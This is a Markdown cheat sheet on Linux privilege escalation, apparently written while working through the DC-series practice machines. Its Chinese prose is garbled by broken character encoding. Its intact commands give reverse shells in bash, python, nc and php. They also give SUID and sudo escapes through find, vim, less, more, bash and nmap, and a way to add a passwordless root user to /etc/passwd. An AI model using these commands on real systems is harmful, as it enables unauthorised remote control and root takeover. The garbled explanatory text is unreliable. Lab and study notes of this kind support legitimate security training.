- [��������](#��������)
- [������Ϣ�ռ�](#������Ϣ�ռ�)
- [����shell](#����shell)
- [��Ȩ����](#��Ȩ����)
  - [SUID��Ȩ](#suid��Ȩ)
    - [����find������Ȩ](#����find������Ȩ)
    - [����git](#����git)
    - [����vim/vi](#����vimvi)
    - [����bash](#����bash)
    - [����less](#����less)
    - [����more](#����more)
    - [����nmap](#����nmap)
    - [����exim4](#����exim4)
  - [�����ں�©��](#�����ں�©��)
  - [����root������ִ��](#����root������ִ��)
  - [���û�������](#���û�������)
  - [���ô���©��������](#���ô���©��������)
  - [���õ�����������Ȩ](#���õ�����������Ȩ)
- [�ο�����](#�ο�����)


# ��������
1.suid

2./etc/sudoers�ļ�

3.ls -la 



# ������Ϣ�ռ�

# ����shell
����shellָ���Լ��Ļ�����**��������**(nc -lvp 7777)��Ȼ���ڱ������ߵĻ����Ϸ�����������ȥ�������ǵĻ��������������ߵ�shell���������ǵĻ�����

- kali�����
  - ��������:`nc -lvp 7777`
- �ܿض����ӣ�
  - ֱ������bash: `bash -i >& /dev/tcp/ip/port 0>&1`
    - **bash -i** ��ʾ�ڱ��ش�һ��bash
    - **\>&** ��ʾ����׼����ض��򵽺�����ļ�
    - **/dev/tcp/ip/port**  /dev/tcp/��Linux�е�һ�������豸,������ļ����൱�ڷ�����һ��socket���ã�����һ��socket���ӣ�>&�������/dev/tcp/ip/port����ļ�������׼����ͱ�׼��������ض�������ļ���Ҳ���Ǵ��ݵ�Զ���ϣ����Զ�̿����˶�Ӧ�Ķ˿�ȥ�������ͻ���յ����bash�ı�׼����ͱ�׼�������
  
  - ����python: `python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"`
    - ���Ƚ���socket����
    - Ȼ������os.dup2����׼����(0)����׼���(1)����׼�������(2)��λ��Զ��
    - 
  - ����nc: `nc -e /bin/bash 192.168.0.4 7777`
  - ����php: `php- 'exec("/bin/bash -i >& /dev/tcp/192.168.0.4/7777")'`

# ��Ȩ����
��Ȩ˼·��ͨ����Ϣ�Ѽ����ҿ����õ��ļ�/�ű�/���/�û�/�ں�©��/����ٳ�/�ض�ƽ̨©��/���©��/���/�ȣ�д���ִ�ж�������/�ű�/shell/��Ӹ�Ȩ���û�����Ȩ�ɹ���Ȼ���һ�����á�

## SUID��Ȩ

**suid:Set owner User ID up on execution**

SUID��һ��**�Զ����Ƴ���������õ�����Ȩ��**�������ö����Ƴ����ִ����**��ʱ**ӵ��������Ȩ�ޣ�����ӵ��ִ��Ȩ�޵Ķ����Ƴ�����Ч����

���磬�����û�������ִ��passwd�������޸��Լ����û����룬���û����뱣����/etc/shadow�ļ��С���ϸ�鿴����ļ��ͻᷢ������Ĭ��Ȩ����000��Ҳ����˵����root����Ա���⣬�����û���û�в鿴��༭���ļ���Ȩ�ޡ����ǣ���ʹ��passwd����ʱ�������SUID����Ȩ��λ���Ϳ�����ͨ�û���ʱ��ó��������ߵ���ݣ��ѱ����������Ϣд�뵽shadow�ļ��С�

���û���ִ�г���/�ļ�������ʱ�����ȡ�ļ��������ߵ�Ȩ���Լ������ߵ�UID��GID��
--����˿�������ӵ��rootȨ�޵��ļ�������ȡrootȨ��

����ӵ��rootȨ�޵�suid�ļ�����������,��ͬϵͳ�������ͬ

```bash
    find / -perm -u=s -type f 2>/dev/null 
    find / -user root -perm -4000-print2>/dev/null 
    find / -user root -perm -4000-exec ls -ldb {} \;
```

�û����������Լ���������߲���Ҫ������rootȨ����ִ�������/etc/sudoers������

`sudo -l ���Բ鿴��ǰ�û���Ȩ��`

```bash
    touhid ALL = (root) NOPASSWD: /usr/bin/find
    # ��ʾ���� touchid �����룬���� sudo ִ�� poweroff ���
    touhid ALL = (root) NOPASSWD: /usr/bin/find
    # ����������,���� sudo ִ�� find ����
```


**������ͣ�**

* / ��ʾ���ļ�ϵͳ�Ķ�����������ʼ���ҵ�ÿ��Ŀ¼
* -perm ��ʾ��������Ȩ��
* -u=s��ʾ����root�û�ӵ�е��ļ�
* -type��ʾ��������Ѱ�ҵ��ļ����� f ��ʾ�����ļ���������Ŀ¼�������ļ�
* 2��ʾ�ý��̵ĵڶ����ļ�����������stderr����׼����
* \> ��ʾ�ض���  
* /dev/null��һ��������ļ�ϵͳ������������д�����е��������ݡ�



����������Ȩ��Linux�ļ��У�Nmap, Vim, find, bash, more, less, nano, cp

eg:�г�DC-1��ӵ��rootȨ�޵Ŀ�ִ���ļ����£�

<img src="images/image-20210318203412742.png" width="67%;" />

### ����find������Ȩ

**�г���ϰ��DC-1**

```bash
    #����exec������Ȩ
    mkdir test  #����test�ļ���
    touch test  #���ߴ���test�ļ�
    find test -exec "whoami" \;  #����exec�鿴��ǰ�û������root��˵����ǰ��������rootȨ��ִ�е�
    find test -exec '/bin/sh' \;  
```

<img src="images/find3.png" width="70%"/>


```bash
    #�����������Ȩ
    find test -exec netcat -lvp 5555 -e /bin/sh \;
    netcat �����IP 5555
```

<img src="images/find1.png" width="70%">
<img src="images/find2.png" width="50%">

### ����git
**�г���ϰ��DC-2**

sudo git -p help:ǿ�ƽ��뽻��״̬����ҳ�滺�����޷���ʾȫ����Ϣ

<img src="images/git.png" width="70%">

### ����vim/vi

```bash
#��vim������ESC
:set shell=/bin/sh
:shell
#������ʽ
sudo vim -c '!sh'
```

### ����bash
```bash
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```

### ����less
```bash
less /etc/passwd
!/bin/sh
```

### ����more
```bash
more /home/pelle/myfile
!/bin/bash
```

### ����nmap
**�г���ϰ��DC-6**

��ʱ�����Ա���nmap����sudoȨ�ޣ���Ϊ�ڽ���UDP��TCP��SYNɨ��ʱ����Ҫ��rootȨ��

<img src="images/nmap1.png">

```bash
    # 5.2�Ժ�ͨ�������Զ���ű�ִ������
    echo 'os.execute("/bin/sh")' > getshell
    sudo nmap --script=getshell
    #or ��ҪsudoȨ��  5.2��ǰ
    nmap -interactive 
    !sh
```


### ����exim4
**�г���ϰ��DC-8**

��Ҫ����exim4��������©����������Ȩ

kali��`searchsploit exim`����������exim��ص�����exp����Ҫ��ȷ��exim�İ汾��Ϣ

<img src='images/exim4.png'/>

<img src='images/exim-exploit.png'/>

## �����ں�©��


## ����root������ִ��
**�г���ϰ��DC-4**

������sudoȨ�޵ĳ�����/etc/passwd�ļ���д�룬����һ��--������һ���û�

`echo "admin::0:0:::/bin/bash"|sudo teehee -a /etc/passwd`  ����һ��admin�û���Ȩ��Ϊroot

���ӵ��û������ֶ�����Ϊ�գ�UserID��GroupIDΪ0��ʾroot�û�

/etc/passwd���ֶκ���Ϊ��
`username:password:User ID:Group ID:comment:home directory:shell`





## ���û�������

<img src="images/path1.png" width="80%">

Ҫ��ǰ�û���path��������/usr/sbin���ɿ�������ķ���

����һ����ִ���ļ����������ᷢ�ָ��ļ���suidȨ��
```c
    #include<unistd.h>
    void main()
    {
    setuid(0);
    setgid(0);
    system("cat /etc/passwd");
    }
    // aaa.c
    //gcc test.c -o shell

```
����ִ��ִ�б���õ�shell��ִ�н�����£�
<img src="images/path2.png" width="60%">

## ���ô���©��������



## ���õ�����������Ȩ



# �ο�����
- [Drupalʹ���ֲ�](https://drupalchina.gitbooks.io/begining-drupal8-cn/content/)
- [Linux SUID ��Ȩ](https://jlkl.github.io/2020/01/27/Web_15/)
- [Linux��Ȩ�ļ��ܽ�](https://xz.aliyun.com/t/7924#toc-0)

